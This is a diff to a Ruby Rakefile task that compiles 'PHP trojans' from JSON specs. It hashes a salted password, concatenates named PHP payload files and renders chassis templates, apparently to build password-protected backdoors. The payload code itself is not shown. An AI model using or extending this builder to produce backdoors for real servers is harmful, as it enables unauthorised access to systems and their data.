@@ -73,7 +73,7 @@ namespace :trojan do
         desc "Compiles the PHP trojans"
         task :php do
             # notify the user
-            print 'Compiling PHP trojan....'
+            puts 'Compiling PHP trojans....'
 
             # delete the old builds
             `rm ./trojan/bin/debug/php/*`
@@ -87,15 +87,18 @@ namespace :trojan do
                 # load the specs
                 trojan =  JSON::parse(File.read('./trojan/spec/php/' + f))
 
+                # notify details
+                print "Compiling '#{trojan['name']}'..."
+
                 # calculate the password hash
                 params[:salt] = trojan['salt']
                 params[:hash] = Digest::SHA1.hexdigest(trojan['password'] + trojan['salt'])
 
                 # load the trojan payloads
-                #trojan['payloads'].each do |payload|
-                #    puts payload
-                #end
-                #exit
+                params[:payloads] = ''
+                trojan['payloads'].each do |payload|
+                    params[:payloads] +=  File.read('./trojan/template/php/payload/' + payload + '.php');
+                end
                 
                 # compile the trojan's erb template
                 erb = ERB.new(File.read('./trojan/template/php/chassis/' + trojan['chassis'] + '.php.erb' ), 0, '<>', 'buffer')
